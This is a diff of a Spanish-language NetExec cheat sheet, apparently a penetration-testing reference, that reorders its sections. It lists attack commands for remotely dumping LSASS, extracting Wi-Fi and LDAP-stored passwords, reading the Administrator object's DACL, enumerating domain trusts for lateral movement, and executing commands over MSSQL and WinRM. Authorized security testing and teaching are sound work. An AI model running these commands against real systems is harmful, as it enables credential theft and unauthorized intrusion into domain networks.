@@ -229,6 +229,41 @@ netexec ldap <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' -M pre2k
 netexec ldap <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
 ```
 
+#### Obtener las descripciones de los usuarios de LDAP
+```
+netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M user-desc
+```
+
+#### Obtener las descripciones más detalladas de los usuarios de LDAP
+```
+netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-desc-users
+```
+
+#### Obtener la contraseña de algun usuario
+```
+netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-userPassword
+```
+
+#### Obtener la contraseña de algun usuario en los sistemas basados en Unix
+```
+netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-unixUserPassword
+```
+
+#### Lectura DACL (Discretionary Access Control List) se utiliza para ver las listas de control de acceso de objetos específicos de AD, lo que puede ayudar a identificar accesos excesivamente permisivos o configuraciones erróneas
+```
+netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --kdcHost <DOMAIN> -M daclread -o TARGET=Administrator ACTION=read
+```
+
+#### Enumerar las relaciones de confianza entre diferentes dominios, lo que puede ser útil para el movimiento lateral y para atacar dominios interconectados
+```
+netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M enum_trusts
+```
+
+#### Ejecutar comando Whoami
+```
+netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M whoami
+```
+
 ### MSSQL
 
 #### Authentication
@@ -246,7 +281,7 @@ netexec mssql <IP-TARGET> -u <USERNAME> -p <PASSWORD> -x <COMMAND-TO-EXECUTE>
 netexec mssql <IP-TARGET> -u <USERNAME> -p <PASSWORD> --get-file <OUTPUT-NAME> <TARGET-FILE>
 ```
 
-#### FTP
+### FTP
 
 #### Listar archivos y directorios
 ```
@@ -351,62 +386,32 @@ netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> -M veeam
 netexec smb <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' -M backup_operator
 ```
 
-
-
+### LSASS
 
 #### Dumpear de forma remota el contenido de LSASS utilizando la herramienta NanoDump
 ```
 netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M nanodump
 ```
 
+### WIFI
+
 #### Dumping WIFI Password
 ```
 netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M wireless
 ```
+
+### Network
 
 #### Ver información sobre la red y subredes del equipo
 ```
 netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-network
 ```
 
-#### Obtener las descripciones de los usuarios de LDAP
-```
-netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M user-desc
-```
-
-#### Obtener las descripciones más detalladas de los usuarios de LDAP
-```
-netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-desc-users
-```
-
-#### Obtener la contraseña de algun usuario
-```
-netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-userPassword
-```
-
-#### Obtener la contraseña de algun usuario en los sistemas basados en Unix
-```
-netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-unixUserPassword
-```
-
-#### Lectura DACL (Discretionary Access Control List) se utiliza para ver las listas de control de acceso de objetos específicos de AD, lo que puede ayudar a identificar accesos excesivamente permisivos o configuraciones erróneas
-```
-netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --kdcHost <DOMAIN> -M daclread -o TARGET=Administrator ACTION=read
-```
-
-#### Ejecutar comando Whoami
-```
-netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M whoami
-```
+### PowerShell
 
 #### Ejecutar comando Powershell
 ```
 netexec winrm <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -C '<COMMAND>'
-```
-
-#### Enumerar las relaciones de confianza entre diferentes dominios, lo que puede ser útil para el movimiento lateral y para atacar dominios interconectados
-```
-netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M enum_trusts
 ```
 
 ---
